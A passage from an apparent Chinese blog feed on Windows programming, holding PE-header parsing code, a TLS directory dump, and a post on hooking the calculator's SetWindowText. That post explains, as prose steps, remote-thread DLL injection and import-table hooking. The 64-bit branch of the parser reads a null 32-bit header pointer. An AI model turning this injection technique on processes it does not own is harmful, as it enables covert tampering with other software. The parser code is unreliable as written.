class="comment">//显示TLS目录信息</span></span><br><span class="line"><span class="built_in">DumpTlsDirectory2</span>(&amp;ImageNtHeaders-&gt;OptionalHeader, (LPBYTE)ImageBase,ImageDataDirectory.VirtualAddress);</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄 释放内存</span></span><br><span class="line"><span class="keyword">if</span> (ImageBase != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">GlobalFree</span>(ImageBase);</span><br><span class="line">ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (v1 != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">GlobalFree</span>(v1);</span><br><span class="line">v1 = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FileHandle != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(FileHandle);</span><br><span class="line">FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line">&#125;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Please Input Anykey to Exit\r\n&quot;</span>));</span><br><span class="line">_gettchar();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory2</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD VirtualAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL IsWow64 = FALSE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsOptionalHeaderPE32Plus</span>(ImageOptionalHeader, &amp;IsWow64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWow64==FALSE)</span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)VirtualAddress);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)VirtualAddress);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p  \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以AlignmentLength对齐OperateLength, 让OperateLength为AlignmentLength的整数倍</span></span><br><span class="line"><span class="function">LONGLONG <span class="title">AlignmentData</span><span class="params">(LONGLONG OperateLength, LONGLONG AlignmentLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (AlignmentLength == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> OperateLength;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> v1 = OperateLength % AlignmentLength;</span><br><span class="line"><span class="keyword">if</span> (v1 != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> OperateLength + AlignmentLength - v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OperateLength;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hook计算器以显示中文数字</title>
      <link href="/2024/02/04/Hook%E8%AE%A1%E7%AE%97%E5%99%A8%E4%BB%A5%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97/"/>
      <url>/2024/02/04/Hook%E8%AE%A1%E7%AE%97%E5%99%A8%E4%BB%A5%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h1 id="计算器显示中文数字HookLet"><a href="#计算器显示中文数字HookLet" class="headerlink" title="计算器显示中文数字HookLet"></a>计算器显示中文数字HookLet</h1><p>注入DLL.dll到计算器程序</p><p>找到导入表描述，在FirstThunk中把user32.dll文件中导出函数地址改为自己的DLL.dll导出函数的地址</p><p>计算器点击数字调用的函数为SetWindowText</p><p>注入方式有两种，CreateRemoteThread远程线程，SetWindowHookEx全局钩子</p><p>提权，开启UAC 管理员身份运行</p><p>可以在项目右键属性，链接器，清单文件，打开UAC运行级别即可</p><p><img src="/.io//image-20230118225323796.png" alt="image-20230118225323796"></p><p>这里使用远程线程注入，填写动态库的完整路径申请内存，在对方进程中开启新的线程，得到LoadLibrary地址，执行LoadLibrary加载自己的动态库</p><p>得到自己动态库的完整路径</p><p>得到PID</p><p>申请虚拟内存</p><p>将路径写入虚拟内存</p><p>启动线程</p><p>从目标进程中的user32模块导出表中获取SetWindowText函数地址</p><p>获得进程中第一个模块Taskmgr.exe地址</p><p>定位到导入表描述</p><p>该模块是加载状态的，因此定位到FirstThunk，里面已经变为真正的函数地址，判断是否为空</p><p>定位到模块名</p><p>比较得到与我们要感染的模块相同，此时ImageImportDescriptor指针指向的FirstThunk即为对应模块</p><p><img src="/.io//image-20230119001522337.png" alt="image-20230119001522337"></p><p>获取user32导出表中SetWindowText函数地址</p><p>定位FirstThunk指向的IMAGE_THUNK_DATA，此处就是函数的地址</p><p>遍历这部分IAT表，ImageThunkData-&gt;u1.Function与获取到的地址进行比较</p><p>IAT表不可写，修改内存属性</p><p>API函数入口地址改成我们构造的函数的地址。函数的实际地址是函数指针名加jmp指令E9后的数字再加5</p><p>导入表卸载</p><p><img src="/.io//image-20230119005641578.png" alt="image-20230119005641578"></p><p>修改内存包含属性</p><p>将修改过的地址改为原本的地址</p>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PE文件格式</title>
      <link href="/2024/02/04/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
      <url>/2024/02/04/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><p><strong>此文章为自查文章，部分内容没有详细解释。具体概念出自李承远《逆向工程核心原理》。</strong></p><p>.exe .dll .sys</p><p>PE或PE+，注意没有PE64</p><p>C:\Windows\system32\notepad.exe &#x2F;&#x2F;32位</p><p>C:\Windows\syswow64\notepad.exe &#x2F;&#x2F;64位</p><p>PE文件的标志</p><p><img src="/.io//image-20220905213538297.png" alt="image-20220905213538297"></p><p>PE格式文件加载到内存中的情形</p><p><img src="/.io//image-20220905213651291.png" alt="image-20220905213651291"></p><p>DOS头 windows.h中有定义  _IMAGE_DOS_HEADE</p><p>NULL区域是未使用的区域用0填充的，补齐文件或内存粒度对齐</p><p><em><em>重点关注0x00 word e_magic&#x3D;0x5a4d 对应MZ, 和dword(long)0x3c e_ifanew, (PIMAGE_NT_HEADERS）(BYTE</em>)ImageDosHeader+(ImagerDosHeader-&gt;e_ifanew)就是NT_Headers的地址</em>* </p><p>64位下的地址为8字节，32位为4字节，如果文件是64位，则4字节定位的地址必为RVA</p><p>32、64位的最大区别是NT_HEADERS后面是否跟数字64</p><p>NtHeaders除了signature签名还有file optional header两个成员，往下是section header signature里是四个字节的dword或long的PE00，即0x005040</p><p><img src="/.io//image-20220905215743384.png" alt="image-20220905215743384"></p><p>VA是虚拟内存的绝对地址，RVA是相对虚拟地址 RVA+ImageBase &#x3D; VA</p><p><img src="/.io//image-20220905220631629.png" alt="image-20220905220631629"></p><p>PE头内部信息大多以RVA形式存在，因为PE文件被加载到内存空间的时候，每一次的绝对地址都是不一样的。32位WindowsOS中，各进程分配有4GB内存，即VA的值最多到FFFFFFFF</p><p>0-2^32-1  0-0xFFFFFFFF-1</p><p>0-2^64-1  0-0xFFFFFFFFFFFFFFFF-1但现在16进制还不使用前四个F。64位下的0是0xFFFF 0000 0000 0000，也就是只用到2^48-1</p><p>文件操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ImageHlp.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _tmain()</span><br><span class="line">&#123;</span><br><span class="line">_tsetlocale(LC_ALL, _T(<span class="string">&quot;Chinese-simplified&quot;</span>));</span><br><span class="line"><span class="comment">//获得文件句柄</span></span><br><span class="line"><span class="type">char</span>* VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">DWORD FileSizeLow = <span class="number">0</span>;</span><br><span class="line">DWORD FileSizeHigh = <span class="number">0</span>;</span><br><span class="line">DWORD  NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">PIMAGE_DOS_HEADER ImageDosHeader = <span class="literal">NULL</span>; <span class="comment">//指针</span></span><br><span class="line">PIMAGE_NT_HEADERS ImageNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_FILE_HEADER ImageFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 ImageOptionalHeader32 = <span class="literal">NULL</span>;   <span class="comment">//区分32与64</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER64 ImageOptionalHeader64 = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_DATA_DIRECTORY    ImageDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_SECTION_HEADER    ImageSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WORD Characteristics = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;%p\r\n&quot;</span>), <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"></span><br><span class="line">TCHAR  v2[] = _T(<span class="string">&quot;CFF Explorer.exe&quot;</span>);  <span class="comment">//二进制文件</span></span><br><span class="line">TCHAR  v1[] = _T(<span class="string">&quot;avfilter-6.dll&quot;</span>);</span><br><span class="line">TCHAR  v3[] = _T(<span class="string">&quot;hidden.sys&quot;</span>);</span><br><span class="line">TCHAR  v4[] = _T(<span class="string">&quot;PE文件格式.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据文件路径打开文件</span></span><br><span class="line"><span class="comment">//文件句柄</span></span><br><span class="line">HANDLE FileHandle = <span class="built_in">CreateFile</span>(v1, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据文件句柄获取文件大小</span></span><br><span class="line">FileSizeLow = <span class="built_in">GetFileSize</span>(FileHandle, &amp;FileSizeHigh);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FileSizeLow == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据文件大小进程内存申请</span></span><br><span class="line">VirtualAddress = <span class="keyword">new</span> <span class="type">char</span>[FileSizeLow];</span><br><span class="line"><span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读取文件内容到我们动态申请的内存中</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ReadFile</span>(FileHandle, VirtualAddress, FileSizeLow, &amp;NumberOfBytesRead, <span class="literal">NULL</span>) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">ImageDosHeader = (PIMAGE_DOS_HEADER)VirtualAddress;</span><br><span class="line"><span class="keyword">if</span> (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//VA RVA</span></span><br><span class="line">ImageNtHeaders = (PIMAGE_NT_HEADERS)(VirtualAddress + (ImageDosHeader-&gt;e_lfanew));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ImageFileHeader = &amp;(ImageNtHeaders-&gt;FileHeader);   <span class="comment">//定位到了第三个PE结构</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (ImageFileHeader-&gt;Machine)  <span class="comment">//判断出该PE文件的位数  exe dll sys</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IMAGE_FILE_MACHINE_I386:</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;x86Pe文件\r\n&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IMAGE_FILE_MACHINE_IA64:</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Intelx64Pe文件\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IMAGE_FILE_MACHINE_AMD64:</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Amdx64Pe文件\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;NumberOfSections:%d\r\n&quot;</span>), ImageFileHeader-&gt;NumberOfSections);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfOptionalHeader:%p\r\n&quot;</span>), ImageFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_I386)  <span class="comment">//判断正在分析的PE文件的位数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;SizeOfOptionalHeader != <span class="built_in">sizeof</span>(IMAGE_OPTIONAL_HEADER32))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">ImageOptionalHeader32 = (PIMAGE_OPTIONAL_HEADER32)&amp;(ImageNtHeaders-&gt;OptionalHeader);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_IA64 ||</span><br><span class="line">ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_AMD64)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;SizeOfOptionalHeader != <span class="built_in">sizeof</span>(IMAGE_OPTIONAL_HEADER64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">ImageOptionalHeader64 = (PIMAGE_OPTIONAL_HEADER64)&amp;(ImageNtHeaders-&gt;OptionalHeader);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_EXECUTABLE_IMAGE)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;ExecutableImage文件\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_SYSTEM)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;System文件\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_DLL)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Dll文件\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader32 != <span class="literal">NULL</span>)   <span class="comment">//真正分析的Pe文件是个32位</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader32-&gt;Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)   <span class="comment">//PE</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4个字节的RVA</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;程序最先执行的代码起始位置的RVA%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;AddressOfEntryPoint);  <span class="comment">//Hook OEP</span></span><br><span class="line"><span class="comment">//4个字节的绝对地址</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;优先装载地址%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;ImageBase);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重点概念</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;文件对齐粒度%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;FileAlignment);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;内存对齐粒度%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SectionAlignment);</span><br><span class="line"></span><br><span class="line"><span class="comment">//exe 0x400000</span></span><br><span class="line"><span class="comment">//dll 0x10000000</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;镜像大小%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SizeOfImage);  <span class="comment">//内存粒度对齐后的整个PE文件的大小</span></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;所有头部大小%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SizeOfHeaders);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;子系统%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;Subsystem);      <span class="comment">//可以判断该PE文件的文件属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重点的重点</span></span><br><span class="line"><span class="comment">//设计16结构体组成的结构体数组</span></span><br><span class="line"><span class="comment">//每个结构体由两个成员组成</span></span><br><span class="line">ImageDataDirectory = &amp;(ImageOptionalHeader32-&gt;DataDirectory[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES;i++)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;%d VirtualAddress:%p\r\n&quot;</span>),i, ImageDataDirectory-&gt;VirtualAddress);     </span><br><span class="line">_tprintf(_T(<span class="string">&quot;%d ViewSize:%p\r\n&quot;</span>), i,ImageDataDirectory-&gt;Size);</span><br><span class="line"></span><br><span class="line">ImageDataDirectory++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader64 != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader32-&gt;Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)   <span class="comment">//PE+</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4个字节</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;程序最先执行的代码起始位置的:RVA%p\r\n&quot;</span>), 